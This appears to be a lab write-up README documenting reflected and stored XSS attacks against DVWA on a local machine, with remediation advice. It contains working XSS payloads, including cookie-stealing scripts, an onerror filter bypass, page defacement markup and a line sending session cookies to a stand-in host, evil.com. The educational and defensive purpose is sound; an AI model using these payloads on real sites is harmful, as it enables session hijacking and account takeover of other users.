# Cross-Site Scripting (XSS) Attack & Analysis — DVWA

A hands-on web application penetration testing project demonstrating Reflected and Stored XSS vulnerabilities using DVWA (Damn Vulnerable Web Application), covering basic script injection, cookie theft, page defacement, and WAF bypass techniques.

---

## Lab Environment

| Component | Details |
|-----------|---------|
| Attacker machine | Kali Linux (VirtualBox) |
| Target | DVWA running on Apache/MariaDB (localhost) |
| Tools used | Browser, Developer Tools, MariaDB CLI |
| Security level | Low (intentional — for learning) |

> All activity performed in an isolated local lab environment. No real systems involved.

---

## What is XSS?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into a web page that is then executed in the browser of anyone who visits that page.

Unlike SQL injection which targets the database backend, XSS targets the frontend — attacking other users of the application.

**Two types demonstrated in this project:**

| Type | How it works | Who is affected |
|------|-------------|----------------|
| Reflected XSS | Payload is in the URL, reflected back immediately | Only whoever clicks the malicious link |
| Stored XSS | Payload is saved to the database permanently | Every single visitor to the page |

---

## Attack Methodology

```
Step 1 → Identify input fields that reflect output without sanitisation
Step 2 → Basic script injection (Reflected XSS)
Step 3 → Stored XSS — persistent payload in database
Step 4 → Cookie theft via document.cookie
Step 5 → WAF bypass using onerror event handler
Step 6 → Document database evidence
```

---

## Attack 1 — Reflected XSS

**Target:** `http://localhost/DVWA/vulnerabilities/xss_r/`

The "What's your name?" field reflects input directly back onto the page without sanitisation.

**Payload — basic alert:**
```html
<script>alert('XSS')</script>
```
**Result:** JavaScript alert fires in the browser — proves script execution.

**Payload — cookie theft:**
```html
<script>alert(document.cookie)</script>
```
**Result:** Session cookie exposed in alert. In a real attack this gets sent to an attacker-controlled server — account takeover without needing a password.

**Payload — malicious URL:**
```
http://localhost/DVWA/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```
**Result:** Entire URL becomes the attack vector. Send this link to a victim — script runs in their browser automatically.

**Screenshot:** `screenshots/reflected_xss_alert.png`

---

## Attack 2 — Stored XSS

**Target:** `http://localhost/DVWA/vulnerabilities/xss_s/`

The guestbook form saves input to the database. Any JavaScript stored here executes for every visitor permanently.

### Payload 1 — Basic stored script:
- Name: `hacker`
- Message: `<script>alert('Stored XSS')</script>`

**Result:** Alert fires for every visitor on every page load — permanently stored.

---

### Payload 2 — Cookie theft via document.write:
- Name: `attacker10`
- Message:
```html
<script>document.write('<h2>Stolen Cookie: ' + document.cookie + '</h2>')</script>
```
**Result:** Session cookie written directly into the page HTML — visible to anyone who views source.

---

### Payload 3 — Visitor redirect:
- Name: `victim`
- Message:
```html
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```
**Result:** Every visitor is silently redirected to attacker's server with their session cookie appended to the URL — mass account hijacking.

---

### Payload 4 — WAF Bypass using onerror (no script tag):
- Name: `attacker5`
- Message:
```html
<img src="x" onerror="alert('XSS by Attacker — Session: ' + document.cookie)">
```
**Result:** Uses an image error event instead of a script tag. Many Web Application Firewalls block `<script>` tags but miss event handlers — this bypasses basic filters entirely.

**Screenshot:** `screenshots/stored_xss_onerror.png`

---

### Payload 5 — Page defacement:
- Name: `attacker`
- Message:
```html
<h1 style="color:red;font-size:50px">HACKED BY ATTACKER</h1>
```
**Result:** Permanent visual defacement of the page — no JavaScript required, pure HTML injection.

**Screenshot:** `screenshots/page_defacement.png`

---

## Database Evidence

All payloads confirmed stored in the database:

```
+------------+------------+------------------------------------------------------------------------------------+
| comment_id | name       | comment                                                                            |
+------------+------------+------------------------------------------------------------------------------------+
|         14 | attacker5  | <img src="x" onerror="alert('XSS by Shreyashi — Session: ' + document.cookie)">   |
|         15 | attacker10 | <script>document.write('<h2>Stolen Cookie: ' + document.cookie + '</h2>')</script> |
|         16 | attacker11 | <img src="x" onerror="alert('XSS Confirmed — Cookie: ' + document.cookie)">       |
|         17 | hacker     | <script>alert('Stored XSS')</script>                                               |
|         18 | victim     | <script>document.location='http://evil.com/steal?c='+document.cookie</script>     |
+------------+------------+------------------------------------------------------------------------------------+
```

Raw dump: `xss_guestbook_dump.txt`

---

## Real-World Impact

| Attack | Real-World Consequence |
|--------|----------------------|
| Reflected XSS | Phishing links — victim clicks, attacker steals session |
| Stored XSS | Every visitor compromised — no interaction needed beyond visiting the page |
| Cookie theft | Account takeover without knowing the password |
| onerror bypass | Evades WAF and basic input filters |
| Redirect attack | Mass phishing — all visitors sent to fake login page |

---

## Why HttpOnly Cookies Matter

During testing, `document.cookie` returned limited data because modern browsers set the **HttpOnly** flag on session cookies — this prevents JavaScript from reading them directly.

**Lesson:** HttpOnly is a critical defence against XSS-based session hijacking. Always set it in production.

```php
// Secure cookie setting
setcookie('session', $value, [
    'httponly' => true,
    'secure'   => true,
    'samesite' => 'Strict'
]);
```

---

## How to Fix XSS

**Wrong (vulnerable):**
```php
echo "Hello " . $_GET['name'];
```

**Right — output encoding:**
```php
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars()` converts `<script>` into `&lt;script&gt;` — rendered as text, never executed as code.

**Additional defences:**
- Content Security Policy (CSP) header — whitelists allowed script sources
- Input validation and whitelisting
- HttpOnly and Secure flags on all cookies
- X-XSS-Protection header

---

## Files in This Repo

| File | Description |
|------|-------------|
| `README.md` | Full project documentation |
| `xss_guestbook_dump.txt` | Raw database dump showing stored payloads |
| `/screenshots` | Browser and terminal screenshots |

---

## What I Learned

- The difference between Reflected and Stored XSS and why Stored is more dangerous
- How JavaScript injected into a page can steal session cookies and hijack accounts
- Why `<script>` tag blocking alone is not enough — onerror and other event handlers bypass it
- How HttpOnly cookies protect against XSS-based session theft
- Why output encoding with `htmlspecialchars()` completely prevents XSS
- Real-world impact — a single unprotected input field can compromise every user of an application

---

## References

- [OWASP XSS](https://owasp.org/www-community/attacks/xss)
- [OWASP XSS Filter Evasion Cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
